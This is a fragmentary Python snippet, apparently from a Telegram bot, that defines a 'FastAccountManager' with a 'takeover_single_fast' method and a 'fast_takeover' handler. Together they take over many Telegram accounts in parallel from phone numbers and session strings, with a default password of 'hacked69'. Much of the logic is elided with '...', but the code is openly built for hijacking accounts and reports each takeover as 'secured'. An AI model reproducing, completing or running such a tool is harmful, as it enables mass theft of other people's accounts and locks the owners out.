...
class FastAccountManager:
    ...
    async def takeover_single_fast(self, phone, session_string, password="hacked69"):
        """Fast account takeover"""
        try:
            ...
            if await client.is_user_authorized():
                ...
                return True, f"✅ {phone} secured!"
            else:
                await client.disconnect()
                return False, f"❌ {phone} - Invalid session"
                
        except Exception as e:
            return False, f"❌ {phone} - {str(e)}"
...
async def fast_takeover(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """FAST parallel account takeover"""
    ...
    for acc in accounts:
        ...
        if phone and session:
            task = manager.takeover_single_fast(phone, session, password)
            tasks.append(task)
